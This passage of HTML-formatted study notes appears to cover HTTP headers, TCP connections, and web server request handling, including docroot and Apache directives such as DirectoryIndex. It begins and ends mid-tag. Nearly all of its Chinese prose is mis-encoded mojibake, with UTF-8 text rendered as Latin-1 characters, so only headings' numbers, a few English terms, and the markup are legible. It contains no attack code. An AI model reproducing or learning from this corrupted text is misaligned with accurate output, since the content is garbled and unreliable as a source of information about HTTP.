é¦–éƒ¨</h3><p>åœ¨è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ä¸­éƒ½å¯ä»¥ç”¨é¦–éƒ¨æ¥æä¾›ä¿¡æ¯,æœ‰äº›é¦–éƒ¨æ˜¯æŸç§æŠ¥æ–‡ä¸“ç”¨çš„ï¼Œæœ‰äº›é¦–éƒ¨æ›´é€šç”¨ä¸€äº›ã€‚</p><p>äº”ä¸ªä¸»è¦ç±»å‹:</p><ul><li>é€šç”¨é¦–éƒ¨</li><li>è¯·æ±‚é¦–éƒ¨</li><li>å“åº”é¦–éƒ¨</li><li>å®ä½“é¦–éƒ¨</li><li>æ‰©å±•é¦–éƒ¨</li></ul><h4 id="3-5-1-é€šç”¨é¦–éƒ¨"><a href="#3-5-1-é€šç”¨é¦–éƒ¨" class="headerlink" title="3.5.1 é€šç”¨é¦–éƒ¨"></a>3.5.1 é€šç”¨é¦–éƒ¨</h4><p>è¿™äº›é¦–éƒ¨æä¾›äº†ä¸æŠ¥æ–‡ç›¸å…³çš„æœ€åŸºæœ¬çš„ä¿¡æ¯ã€‚<br><img src="/../img/%E9%80%9A%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%80%A7%E9%A6%96%E9%83%A8.png" alt="é€šç”¨çš„ä¿¡æ¯æ€§é¦–éƒ¨"></p><h4 id="3-5-2-è¯·æ±‚é¦–éƒ¨"><a href="#3-5-2-è¯·æ±‚é¦–éƒ¨" class="headerlink" title="3.5.2 è¯·æ±‚é¦–éƒ¨"></a>3.5.2 è¯·æ±‚é¦–éƒ¨</h4><p>è¯·æ±‚é¦–éƒ¨æ˜¯åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­æœ‰æ„ä¹‰çš„é¦–éƒ¨ï¼Œç”¨äºè¯´æ˜æ˜¯è°æˆ–ä»€ä¹ˆåœ¨å‘é€è¯·æ±‚ã€è¯·æ±‚æºè‡ªä½•å¤„ï¼Œæˆ–è€…å®¢æˆ·ç«¯çš„å–œå¥½åŠèƒ½åŠ›.</p><h5 id="Accept-é¦–éƒ¨"><a href="#Accept-é¦–éƒ¨" class="headerlink" title="Accept é¦–éƒ¨"></a>Accept é¦–éƒ¨</h5><h5 id="æ¡ä»¶è¯·æ±‚é¦–éƒ¨"><a href="#æ¡ä»¶è¯·æ±‚é¦–éƒ¨" class="headerlink" title="æ¡ä»¶è¯·æ±‚é¦–éƒ¨"></a>æ¡ä»¶è¯·æ±‚é¦–éƒ¨</h5><p>ä¸ºè¯·æ±‚åŠ ä¸ŠæŸäº›é™åˆ¶</p><h5 id="å®‰å…¨è¯·æ±‚é¦–éƒ¨"><a href="#å®‰å…¨è¯·æ±‚é¦–éƒ¨" class="headerlink" title="å®‰å…¨è¯·æ±‚é¦–éƒ¨"></a>å®‰å…¨è¯·æ±‚é¦–éƒ¨</h5><p>è¦æ±‚å®¢æˆ·ç«¯åœ¨è·å–ç‰¹å®šçš„èµ„æºä¹‹å‰ï¼Œå…ˆå¯¹è‡ªèº«è¿›è¡Œè®¤è¯ã€‚</p><h5 id="ä»£ç†è¯·æ±‚é¦–éƒ¨"><a href="#ä»£ç†è¯·æ±‚é¦–éƒ¨" class="headerlink" title="ä»£ç†è¯·æ±‚é¦–éƒ¨"></a>ä»£ç†è¯·æ±‚é¦–éƒ¨</h5><h4 id="3-5-3-å“åº”é¦–éƒ¨"><a href="#3-5-3-å“åº”é¦–éƒ¨" class="headerlink" title="3.5.3 å“åº”é¦–éƒ¨"></a>3.5.3 å“åº”é¦–éƒ¨</h4><p>å“åº”é¦–éƒ¨ä¸ºå®¢æˆ·ç«¯æä¾›äº†ä¸€äº›é¢å¤–ä¿¡æ¯ï¼Œæ¯”å¦‚è°åœ¨å‘é€å“åº”ã€å“åº”è€…çš„åŠŸèƒ½ï¼Œç”šè‡³ä¸å“åº”ç›¸å…³çš„ä¸€äº›ç‰¹æ®ŠæŒ‡ä»¤.</p><h5 id="åå•†é¦–éƒ¨"><a href="#åå•†é¦–éƒ¨" class="headerlink" title="åå•†é¦–éƒ¨"></a>åå•†é¦–éƒ¨</h5><p>å°±æ˜¯èµ„æºæœ‰å¤šç§ï¼Œå¯ä»¥è€ƒè™‘è¦å“ªä¸ªã€‚</p><h5 id="å®‰å…¨å“åº”é¦–éƒ¨"><a href="#å®‰å…¨å“åº”é¦–éƒ¨" class="headerlink" title="å®‰å…¨å“åº”é¦–éƒ¨"></a>å®‰å…¨å“åº”é¦–éƒ¨</h5><p>HTTP çš„è´¨è¯¢&#x2F;å“åº”è®¤è¯æœºåˆ¶çš„å“åº”ä¾§.</p><h4 id="3-5-3-å®ä½“é¦–éƒ¨"><a href="#3-5-3-å®ä½“é¦–éƒ¨" class="headerlink" title="3.5.3 å®ä½“é¦–éƒ¨"></a>3.5.3 å®ä½“é¦–éƒ¨</h4><p>æä¾›äº†æœ‰å…³å®ä½“åŠå…¶å†…å®¹çš„å¤§é‡ä¿¡æ¯.</p><h5 id="å†…å®¹é¦–éƒ¨"><a href="#å†…å®¹é¦–éƒ¨" class="headerlink" title="å†…å®¹é¦–éƒ¨"></a>å†…å®¹é¦–éƒ¨</h5><p>ä¸å®ä½“å†…å®¹æœ‰å…³çš„ä¿¡æ¯.</p><h5 id="å®ä½“ç¼“å­˜é¦–éƒ¨"><a href="#å®ä½“ç¼“å­˜é¦–éƒ¨" class="headerlink" title="å®ä½“ç¼“å­˜é¦–éƒ¨"></a>å®ä½“ç¼“å­˜é¦–éƒ¨</h5><p>æä¾›äº†ä¸è¢«ç¼“å­˜å®ä½“æœ‰å…³çš„ä¿¡æ¯.</p><h2 id="ç¬¬å››ç« -è¿æ¥ç®¡ç†"><a href="#ç¬¬å››ç« -è¿æ¥ç®¡ç†" class="headerlink" title="ç¬¬å››ç«  è¿æ¥ç®¡ç†"></a>ç¬¬å››ç«  è¿æ¥ç®¡ç†</h2><p>HTTP è¿æ¥æ˜¯ HTTP æŠ¥æ–‡ä¼ è¾“çš„å…³é”®é€šé“.</p><h3 id="4-1-TCP-è¿æ¥"><a href="#4-1-TCP-è¿æ¥" class="headerlink" title="4.1 TCP è¿æ¥"></a>4.1 TCP è¿æ¥</h3><p>ä¸–ç•Œä¸Šå‡ ä¹æ‰€æœ‰çš„ HTTP é€šä¿¡éƒ½æ˜¯ç”± TCP&#x2F;IP æ‰¿è½½çš„.</p><h4 id="4-1-1-TCP-çš„å¯é æ•°æ®ç®¡é“"><a href="#4-1-1-TCP-çš„å¯é æ•°æ®ç®¡é“" class="headerlink" title="4.1.1 TCP çš„å¯é æ•°æ®ç®¡é“"></a>4.1.1 TCP çš„å¯é æ•°æ®ç®¡é“</h4><p>HTTP è¿æ¥å®é™…ä¸Šå°±æ˜¯ TCP è¿æ¥åŠå…¶ä½¿ç”¨è§„åˆ™ã€‚</p><p>TCP ä¸º HTTP æä¾›äº†ä¸€æ¡å¯é çš„æ¯”ç‰¹ä¼ è¾“ç®¡é“.<br><img src="/TCP%E8%BF%9E%E6%8E%A5.png" alt="TCPè¿æ¥"></p><h4 id="4-1-2-TCP-æµæ˜¯åˆ†æ®µçš„ã€ç”±-IP-åˆ†ç»„ä¼ é€"><a href="#4-1-2-TCP-æµæ˜¯åˆ†æ®µçš„ã€ç”±-IP-åˆ†ç»„ä¼ é€" class="headerlink" title="4.1.2 TCP æµæ˜¯åˆ†æ®µçš„ã€ç”± IP åˆ†ç»„ä¼ é€"></a>4.1.2 TCP æµæ˜¯åˆ†æ®µçš„ã€ç”± IP åˆ†ç»„ä¼ é€</h4><p>TCP çš„æ•°æ®æ˜¯é€šè¿‡ IP æ•°æ®æŠ¥çš„å°æ•°æ®å—æ¥å‘é€çš„.</p><p>HTTPS å°±æ˜¯åœ¨ HTTP å’Œ TCP ä¹‹é—´æ’å…¥äº†ä¸€ä¸ªå¯†ç åŠ å¯†å±‚.</p><p><img src="/HTTP%E5%92%8CHTTPS%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88.png" alt="HTTPå’ŒHTTPSç½‘ç»œåè®®æ ˆ"></p><p>æ¯ä¸ª IP æ•°æ®æŠ¥éƒ½åŒ…æ‹¬:</p><ul><li>ä¸€ä¸ª IP åˆ†ç»„é¦–éƒ¨</li><li>ä¸€ä¸ª TCP é¦–æ®µ</li><li>ä¸€ä¸ª TCP æ•°æ®å—</li></ul><h4 id="4-1-3-ä¿æŒ-TCP-è¿æ¥æŒç»­ä¸æ–­åœ°è¿è¡Œ"><a href="#4-1-3-ä¿æŒ-TCP-è¿æ¥æŒç»­ä¸æ–­åœ°è¿è¡Œ" class="headerlink" title="4.1.3 ä¿æŒ TCP è¿æ¥æŒç»­ä¸æ–­åœ°è¿è¡Œ"></a>4.1.3 ä¿æŒ TCP è¿æ¥æŒç»­ä¸æ–­åœ°è¿è¡Œ</h4><p>åœ¨ä»»ä½•æ—¶åˆ»è®¡ç®—æœºéƒ½å¯ä»¥æœ‰å‡ æ¡ TCP è¿æ¥å¤„äºæ‰“å¼€çŠ¶æ€ã€‚TCP æ˜¯é€šè¿‡ç«¯å£å·æ¥ä¿æŒæ‰€æœ‰è¿™äº›è¿æ¥æŒç»­ä¸æ–­åœ°è¿è¡Œ.</p><p>ç«¯å£å·å’Œé›‡å‘˜ä½¿ç”¨çš„ç”µè¯åˆ†æœºå·å¾ˆç±»ä¼¼.</p><p>IP åœ°å€å¯ä»¥å°†ä½ è¿æ¥åˆ°æ­£ç¡®çš„è®¡ç®—æœºï¼Œè€Œç«¯å£å·åˆ™å¯ä»¥å°†ä½ è¿æ¥åˆ°æ­£ç¡®çš„åº”ç”¨ç¨‹åºä¸Šå».</p><p>TCP è¿æ¥æ˜¯é€šè¿‡ 4 ä¸ªå€¼æ¥è¯†åˆ«çš„:</p><ul><li>æº IP åœ°å€</li><li>æºç«¯å£å·</li><li>ç›®çš„ IP åœ°å€</li><li>ç›®çš„ç«¯å£å·<br>è¿™ 4 ä¸ªå€¼ä¸€èµ·å”¯ä¸€å®šä¹‰äº†ä¸€æ¡è¿æ¥ã€‚</li></ul><h4 id="4-1-4-ç”¨-TCP-å¥—æ¥å­—ç¼–ç¨‹"><a href="#4-1-4-ç”¨-TCP-å¥—æ¥å­—ç¼–ç¨‹" class="headerlink" title="4.1.4 ç”¨ TCP å¥—æ¥å­—ç¼–ç¨‹"></a>4.1.4 ç”¨ TCP å¥—æ¥å­—ç¼–ç¨‹</h4><p>æ“ä½œç³»ç»Ÿæä¾›äº†ä¸€äº›æ“çºµå…¶ TCP è¿æ¥çš„å·¥å…·ï¼š<br><img src="/%E5%B8%B8%E8%A7%81%E5%A5%97%E6%8E%A5%E5%AD%97API.png" alt="å¸¸è§å¥—æ¥å­—API"></p><p>é€šä¿¡è¿‡ç¨‹:<br><img src="/TCP%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B.png" alt="TCPé€šä¿¡è¿‡ç¨‹"></p><h3 id="4-2-å¯¹-TCP-æ€§èƒ½çš„è€ƒè™‘"><a href="#4-2-å¯¹-TCP-æ€§èƒ½çš„è€ƒè™‘" class="headerlink" title="4.2 å¯¹ TCP æ€§èƒ½çš„è€ƒè™‘"></a>4.2 å¯¹ TCP æ€§èƒ½çš„è€ƒè™‘</h3><p>HTTP äº‹åŠ¡çš„æ€§èƒ½åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºåº•å±‚ TCP é€šé“çš„æ€§èƒ½ã€‚</p><h4 id="4-2-1-HTTP-äº‹åŠ¡çš„æ—¶å»¶"><a href="#4-2-1-HTTP-äº‹åŠ¡çš„æ—¶å»¶" class="headerlink" title="4.2.1 HTTP äº‹åŠ¡çš„æ—¶å»¶"></a>4.2.1 HTTP äº‹åŠ¡çš„æ—¶å»¶</h4><h3 id="4-3-HTTP-è¿æ¥çš„å¤„ç†"><a href="#4-3-HTTP-è¿æ¥çš„å¤„ç†" class="headerlink" title="4.3 HTTP è¿æ¥çš„å¤„ç†"></a>4.3 HTTP è¿æ¥çš„å¤„ç†</h3><h4 id="4-3-1-å¸¸è¢«è¯¯è§£çš„-Connection-é¦–éƒ¨"><a href="#4-3-1-å¸¸è¢«è¯¯è§£çš„-Connection-é¦–éƒ¨" class="headerlink" title="4.3.1 å¸¸è¢«è¯¯è§£çš„ Connection é¦–éƒ¨"></a>4.3.1 å¸¸è¢«è¯¯è§£çš„ Connection é¦–éƒ¨</h4><p>HTTP å…è®¸åœ¨å®¢æˆ·ç«¯å’Œæœ€ç»ˆçš„æºç«¯æœåŠ¡å™¨ä¹‹é—´å­˜åœ¨ä¸€ä¸² HTTP ä¸­é—´å®ä½“.</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªç›¸é‚»çš„ HTTP åº”ç”¨ç¨‹åºä¼šä¸ºå®ƒä»¬å…±äº«çš„è¿æ¥åº”ç”¨ä¸€ç»„é€‰é¡¹ã€‚</p><p>HTTP çš„ Connection é¦–éƒ¨å­—æ®µä¸­æœ‰ä¸€ä¸ªç”±é€—å·åˆ†éš”çš„<mark>è¿æ¥æ ‡ç­¾</mark>åˆ—è¡¨ï¼Œç”¨äºæŒ‡å®šä¸ä¼šä¼ æ’­åˆ°å…¶ä»–è¿æ¥ä¸­çš„é€‰é¡¹.</p><h4 id="4-3-2-ä¸²è¡Œäº‹åŠ¡å¤„ç†æ—¶å»¶"><a href="#4-3-2-ä¸²è¡Œäº‹åŠ¡å¤„ç†æ—¶å»¶" class="headerlink" title="4.3.2 ä¸²è¡Œäº‹åŠ¡å¤„ç†æ—¶å»¶"></a>4.3.2 ä¸²è¡Œäº‹åŠ¡å¤„ç†æ—¶å»¶</h4><h1 id="ç¬¬äºŒéƒ¨åˆ†-HTTP-ç»“æ„"><a href="#ç¬¬äºŒéƒ¨åˆ†-HTTP-ç»“æ„" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† HTTP ç»“æ„"></a>ç¬¬äºŒéƒ¨åˆ† HTTP ç»“æ„</h1><h2 id="ç¬¬5ç« -Web-æœåŠ¡å™¨"><a href="#ç¬¬5ç« -Web-æœåŠ¡å™¨" class="headerlink" title="ç¬¬5ç«  Web æœåŠ¡å™¨"></a>ç¬¬5ç«  Web æœåŠ¡å™¨</h2><h3 id="5-1-å„ç§å½¢çŠ¶å’Œå°ºå¯¸çš„-Web-æœåŠ¡å™¨"><a href="#5-1-å„ç§å½¢çŠ¶å’Œå°ºå¯¸çš„-Web-æœåŠ¡å™¨" class="headerlink" title="5.1 å„ç§å½¢çŠ¶å’Œå°ºå¯¸çš„ Web æœåŠ¡å™¨"></a>5.1 å„ç§å½¢çŠ¶å’Œå°ºå¯¸çš„ Web æœåŠ¡å™¨</h3><p>â€œWeb æœåŠ¡å™¨â€ å¯ä»¥ç”¨æ¥è¡¨ç¤º Web æœåŠ¡å™¨çš„è½¯ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥è¡¨ç¤ºæä¾› Web é¡µé¢çš„ç‰¹å®šè®¾å¤‡æˆ–è®¡ç®—æœº.</p><h4 id="5-1-1-Web-æœåŠ¡å™¨çš„å®ç°"><a href="#5-1-1-Web-æœåŠ¡å™¨çš„å®ç°" class="headerlink" title="5.1.1 Web æœåŠ¡å™¨çš„å®ç°"></a>5.1.1 Web æœåŠ¡å™¨çš„å®ç°</h4><h4 id="5-1-2-é€šç”¨è½¯ä»¶-Web-æœåŠ¡å™¨"><a href="#5-1-2-é€šç”¨è½¯ä»¶-Web-æœåŠ¡å™¨" class="headerlink" title="5.1.2 é€šç”¨è½¯ä»¶ Web æœåŠ¡å™¨"></a>5.1.2 é€šç”¨è½¯ä»¶ Web æœåŠ¡å™¨</h4><h4 id="5-1-3-Web-æœåŠ¡å™¨è®¾å¤‡"><a href="#5-1-3-Web-æœåŠ¡å™¨è®¾å¤‡" class="headerlink" title="5.1.3 Web æœåŠ¡å™¨è®¾å¤‡"></a>5.1.3 Web æœåŠ¡å™¨è®¾å¤‡</h4><p>Web server appliance æ˜¯é¢„å…ˆæ‰“åŒ…å¥½çš„è½¯ç¡¬ä»¶è§£å†³æ–¹æ¡ˆ.</p><h4 id="5-1-3-åµŒå…¥å¼-Web-æœåŠ¡å™¨"><a href="#5-1-3-åµŒå…¥å¼-Web-æœåŠ¡å™¨" class="headerlink" title="5.1.3 åµŒå…¥å¼ Web æœåŠ¡å™¨"></a>5.1.3 åµŒå…¥å¼ Web æœåŠ¡å™¨</h4><h3 id="5-2-æœ€å°çš„-Perl-Web-æœåŠ¡å™¨"><a href="#5-2-æœ€å°çš„-Perl-Web-æœåŠ¡å™¨" class="headerlink" title="5.2 æœ€å°çš„ Perl Web æœåŠ¡å™¨"></a>5.2 æœ€å°çš„ Perl Web æœåŠ¡å™¨</h3><h3 id="5-3-å®é™…çš„-Web-æœåŠ¡å™¨ä¼šåšäº›ä»€ä¹ˆ"><a href="#5-3-å®é™…çš„-Web-æœåŠ¡å™¨ä¼šåšäº›ä»€ä¹ˆ" class="headerlink" title="5.3 å®é™…çš„ Web æœåŠ¡å™¨ä¼šåšäº›ä»€ä¹ˆ"></a>5.3 å®é™…çš„ Web æœåŠ¡å™¨ä¼šåšäº›ä»€ä¹ˆ</h3><ol><li>å»ºç«‹è¿æ¥</li><li>æ¥æ”¶è¯·æ±‚</li><li>å¤„ç†è¯·æ±‚</li><li>è®¿é—®èµ„æº</li><li>æ„å»ºå“åº”</li><li>å‘é€å“åº”</li><li>è®°å½•äº‹åŠ¡å¤„ç†è¿‡ç¨‹ï¼Œä¼šå°†ä¸å·²å®Œæˆäº‹åŠ¡æœ‰å…³çš„å†…å®¹è®°å½•åœ¨ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</li></ol><h3 id="5-4-ç¬¬ä¸€æ­¥-â€“-æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥"><a href="#5-4-ç¬¬ä¸€æ­¥-â€“-æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥" class="headerlink" title="5.4 ç¬¬ä¸€æ­¥ â€“ æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥"></a>5.4 ç¬¬ä¸€æ­¥ â€“ æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥</h3><h4 id="5-4-1-å¤„ç†æ–°è¿æ¥"><a href="#5-4-1-å¤„ç†æ–°è¿æ¥" class="headerlink" title="5.4.1 å¤„ç†æ–°è¿æ¥"></a>5.4.1 å¤„ç†æ–°è¿æ¥</h4><p>Web æœåŠ¡å™¨å¯ä»¥éšæ„æ‹’ç»æˆ–ç«‹å³å…³é—­ä»»æ„ä¸€æ¡è¿æ¥ã€‚</p><h4 id="5-4-2-å®¢æˆ·ç«¯ä¸»æœºåè¯†åˆ«"><a href="#5-4-2-å®¢æˆ·ç«¯ä¸»æœºåè¯†åˆ«" class="headerlink" title="5.4.2 å®¢æˆ·ç«¯ä¸»æœºåè¯†åˆ«"></a>5.4.2 å®¢æˆ·ç«¯ä¸»æœºåè¯†åˆ«</h4><p>å¯ä»¥ç”¨ â€œåå‘ DNSâ€ å¯¹å¤§éƒ¨åˆ† Web æœåŠ¡å™¨è¿›è¡Œé…ç½®ï¼Œä»¥ä¾¿å°†å®¢æˆ·ç«¯ IP åœ°å€è½¬æ¢æˆå®¢æˆ·ç«¯ä¸»æœºåã€‚</p><p>ä¸»æœºåæŸ¥æ‰¾å¯èƒ½ä¼šèŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œè¿™æ ·ä¼šé™ä½ Web äº‹åŠ¡å¤„ç†çš„é€Ÿåº¦.</p><p>å¯ä»¥ç”¨é…ç½®æŒ‡ä»¤ HostnameLookups å¯ç”¨ Apache çš„ä¸»æœºæŸ¥æ‰¾åŠŸèƒ½.</p><h4 id="5-4-3-é€šè¿‡-ident-ç¡®å®šå®¢æˆ·ç«¯ç”¨æˆ·"><a href="#5-4-3-é€šè¿‡-ident-ç¡®å®šå®¢æˆ·ç«¯ç”¨æˆ·" class="headerlink" title="5.4.3 é€šè¿‡ ident ç¡®å®šå®¢æˆ·ç«¯ç”¨æˆ·"></a>5.4.3 é€šè¿‡ ident ç¡®å®šå®¢æˆ·ç«¯ç”¨æˆ·</h4><p>æœ‰äº› Web æœåŠ¡å™¨è¿˜æ”¯æŒ IETF çš„ idnet åè®®ï¼ŒæœåŠ¡å™¨å¯ä»¥é€šè¿‡ ident åè®®æ‰¾åˆ°å‘èµ· HTTP è¿æ¥çš„ç”¨æˆ·å.</p><p>å¦‚æœå®¢æˆ·ç«¯æ”¯æŒ ident åè®®ï¼Œå°±åœ¨ TCP ç«¯å£ 113 ä¸Šç›‘å¬ ident è¯·æ±‚.</p><p>å¯ä»¥é€šè¿‡ Apache çš„ IdentityCheck on æŒ‡ä»¤å‘ŠçŸ¥ Apache Web æœåŠ¡å™¨ä½¿ç”¨ ident æŸ¥æ‰¾åŠŸèƒ½.</p><h3 id="5-5-ç¬¬äºŒæ­¥-â€“-æ¥æ”¶è¯·æ±‚æŠ¥æ–‡"><a href="#5-5-ç¬¬äºŒæ­¥-â€“-æ¥æ”¶è¯·æ±‚æŠ¥æ–‡" class="headerlink" title="5.5 ç¬¬äºŒæ­¥ â€“ æ¥æ”¶è¯·æ±‚æŠ¥æ–‡"></a>5.5 ç¬¬äºŒæ­¥ â€“ æ¥æ”¶è¯·æ±‚æŠ¥æ–‡</h3><p>è¿æ¥ä¸Šæœ‰æ•°æ®åˆ°è¾¾æ—¶ï¼ŒWeb æœåŠ¡å™¨ä¼šä»ç½‘ç»œè¿æ¥ä¸­è¯»å–æ•°æ®ï¼Œå¹¶å°†è¯·æ±‚æŠ¥æ–‡ä¸­çš„å†…å®¹è§£æå‡ºæ¥ã€‚</p><h4 id="5-5-1-æŠ¥æ–‡çš„å†…éƒ¨è¡¨ç¤ºæ³•"><a href="#5-5-1-æŠ¥æ–‡çš„å†…éƒ¨è¡¨ç¤ºæ³•" class="headerlink" title="5.5.1 æŠ¥æ–‡çš„å†…éƒ¨è¡¨ç¤ºæ³•"></a>5.5.1 æŠ¥æ–‡çš„å†…éƒ¨è¡¨ç¤ºæ³•</h4><p>æœ‰äº› Web æœåŠ¡å™¨è¿˜ä¼šç”¨ä¾¿äºè¿›è¡ŒæŠ¥æ–‡æ“ä½œçš„å†…éƒ¨æ•°æ®ç»“æ„æ¥å­˜å‚¨è¯·æ±‚æŠ¥æ–‡.</p><h4 id="5-5-2-è¿æ¥çš„è¾“å…¥-x2F-è¾“å‡ºå¤„ç†ç»“æ„"><a href="#5-5-2-è¿æ¥çš„è¾“å…¥-x2F-è¾“å‡ºå¤„ç†ç»“æ„" class="headerlink" title="5.5.2 è¿æ¥çš„è¾“å…¥&#x2F;è¾“å‡ºå¤„ç†ç»“æ„"></a>5.5.2 è¿æ¥çš„è¾“å…¥&#x2F;è¾“å‡ºå¤„ç†ç»“æ„</h4><p>ä¸åŒçš„ Web æœåŠ¡å™¨ç»“æ„ä¼šä»¥ä¸åŒçš„æ–¹å¼ä¸ºè¯·æ±‚æœåŠ¡:</p><ul><li>å•çº¿ç¨‹ Web æœåŠ¡å™¨</li><li>å¤šè¿›ç¨‹åŠå¤šçº¿ç¨‹ Web æœåŠ¡å™¨</li><li>å¤ç”¨ I&#x2F;O çš„æœåŠ¡å™¨</li><li>å¤ç”¨çš„å¤šçº¿ç¨‹ Web æœåŠ¡å™¨</li></ul><p><img src="/../img/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%84.png" alt="WebæœåŠ¡å™¨è¾“å…¥è¾“å‡ºç»“æ„"></p><h3 id="5-6-ç¬¬ä¸‰æ­¥-â€“-å¤„ç†è¯·æ±‚"><a href="#5-6-ç¬¬ä¸‰æ­¥-â€“-å¤„ç†è¯·æ±‚" class="headerlink" title="5.6 ç¬¬ä¸‰æ­¥ â€“ å¤„ç†è¯·æ±‚"></a>5.6 ç¬¬ä¸‰æ­¥ â€“ å¤„ç†è¯·æ±‚</h3><h3 id="5-7-ç¬¬å››æ­¥-â€“-å¯¹èµ„æºçš„æ˜ å°„åŠè®¿é—®"><a href="#5-7-ç¬¬å››æ­¥-â€“-å¯¹èµ„æºçš„æ˜ å°„åŠè®¿é—®" class="headerlink" title="5.7 ç¬¬å››æ­¥ â€“ å¯¹èµ„æºçš„æ˜ å°„åŠè®¿é—®"></a>5.7 ç¬¬å››æ­¥ â€“ å¯¹èµ„æºçš„æ˜ å°„åŠè®¿é—®</h3><p>åœ¨ Web æœåŠ¡å™¨å°†å†…å®¹ä¼ é€ç»™å®¢æˆ·ç«¯ä¹‹å‰ï¼Œè¦å°†è¯·æ±‚æŠ¥æ–‡ä¸­çš„ URI æ˜ å°„ä¸º Web æœåŠ¡å™¨ä¸Šé€‚å½“çš„å†…å®¹æˆ–å†…å®¹ç”Ÿæˆå™¨.</p><h4 id="5-7-1-docroot"><a href="#5-7-1-docroot" class="headerlink" title="5.7.1 docroot"></a>5.7.1 docroot</h4><p>æ–‡æ¡£çš„æ ¹ç›®å½•å³ document root (docroot).</p><p>æœ€ç®€å•çš„èµ„æºæ˜ å°„å½¢å¼å°±æ˜¯ç”¨è¯·æ±‚ URI ä½œä¸ºåå­—æ¥è®¿é—® Web æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶.</p><h5 id="è™šæ‹Ÿæ‰˜ç®¡çš„-docroot"><a href="#è™šæ‹Ÿæ‰˜ç®¡çš„-docroot" class="headerlink" title="è™šæ‹Ÿæ‰˜ç®¡çš„ docroot"></a>è™šæ‹Ÿæ‰˜ç®¡çš„ docroot</h5><p>è™šæ‹Ÿæ‰˜ç®¡çš„ Web æœåŠ¡å™¨ä¼šåœ¨åŒä¸€å° Web æœåŠ¡å™¨ä¸Šæä¾›å¤šä¸ª Web ç«™ç‚¹ï¼Œæ¯ä¸ªç«™ç‚¹åœ¨æœåŠ¡å™¨ä¸Šéƒ½æœ‰è‡ªå·±ç‹¬æœ‰çš„æ–‡æ¡£æ ¹ç›®å½•ã€‚</p><h5 id="ç”¨æˆ·çš„ä¸»ç›®å½•-docroot"><a href="#ç”¨æˆ·çš„ä¸»ç›®å½•-docroot" class="headerlink" title="ç”¨æˆ·çš„ä¸»ç›®å½• docroot"></a>ç”¨æˆ·çš„ä¸»ç›®å½• docroot</h5><p>Docroot çš„å¦ä¸€ç§å¸¸è§åº”ç”¨æ˜¯åœ¨ Web æœåŠ¡å™¨ä¸Šä¸ºäººä»¬æä¾›ç§æœ‰çš„ Web ç«™ç‚¹. é€šå¸¸ä¼šæŠŠé‚£äº›ä»¥æ–œæ å’Œæ³¢æµªå· (&#x2F;~) å¼€å§‹ï¼Œåé¢è·Ÿç€ç”¨æˆ·åçš„ URI æ˜ å°„ä¸ºæ­¤ç”¨æˆ·çš„ç§æœ‰æ–‡æ¡£æ ¹ç›®å½•.</p><h4 id="5-7-2-ç›®å½•åˆ—è¡¨"><a href="#5-7-2-ç›®å½•åˆ—è¡¨" class="headerlink" title="5.7.2 ç›®å½•åˆ—è¡¨"></a>5.7.2 ç›®å½•åˆ—è¡¨</h4><p>Web æœåŠ¡å™¨å¯ä»¥æ¥æ”¶å¯¹ç›®å½• URL çš„è¯·æ±‚ï¼Œå…¶è·¯å¾„å¯ä»¥è§£æä¸ºä¸€ä¸ªç›®å½•ã€‚</p><p>å¤§å¤šæ•° Web æœåŠ¡å™¨éƒ½ä¼šå»æŸ¥æ‰¾ç›®å½•ä¸­ä¸€ä¸ªåä¸º index.html æˆ– index.htm çš„æ–‡ä»¶æ¥ä»£è¡¨æ­¤ç›®å½•ã€‚å¦‚æœç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ªç›®å½•çš„ URL, è€Œä¸”è¿™ä¸ªç›®å½•ä¸­æœ‰ä¸€ä¸ªåä¸º index.html (æˆ– index.htm) çš„æ–‡ä»¶ï¼ŒæœåŠ¡å™¨å°±ä¼šè¿”å›é‚£ä¸ªæ–‡ä»¶çš„å†…å®¹.</p><p>åœ¨ Apache Web æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥ç”¨é…ç½®å‘½ä»¤ DirectoryIndex æ¥é…ç½®è¦ä½œä¸ºé»˜è®¤ç›®å½•æ–‡ä»¶ä½¿ç”¨çš„æ–‡ä»¶åé›†åˆã€‚æŒ‡ä»¤ DirectoryIndex ä¼šæŒ‰ç…§ä¼˜å…ˆé¡ºåºåˆ—å‡ºæ‰€æœ‰å¯ä»¥ä½œä¸ºç›®å½•ç´¢å¼•æ–‡ä»¶ä½¿ç”¨çš„æ–‡ä»¶å.</p><h4 id="5-7-3-åŠ¨æ€å†…å®¹èµ„æºçš„æ˜ å°„"><a href="#5-7-3-åŠ¨æ€å†…å®¹èµ„æºçš„æ˜ å°„" class="headerlink" title="5.7.3 åŠ¨æ€å†…å®¹èµ„æºçš„æ˜ å°„"></a>5.7.3 åŠ¨æ€å†…å®¹èµ„æºçš„æ˜ å°„</h4><h3 id="5-8-ç¬¬äº”æ­¥-â€“-æ„å»ºå“åº”"><a href="#5-8-ç¬¬äº”æ­¥-â€“-æ„å»ºå“åº”" class="headerlink" title="5.8 ç¬¬äº”æ­¥ â€“ æ„å»ºå“åº”"></a>5.8 ç¬¬äº”æ­¥ â€“ æ„å»ºå“åº”</h3><h3 id="5-9-ç¬¬å…­æ­¥-â€“-å‘é€å“åº”"><a href="#5-9-ç¬¬å…­æ­¥-â€“-å‘é€å“åº”" class="headerlink" title="5.9 ç¬¬å…­æ­¥ â€“ å‘é€å“åº”"></a>5.9 ç¬¬å…­æ­¥ â€“ å‘é€å“åº”</h3><h3 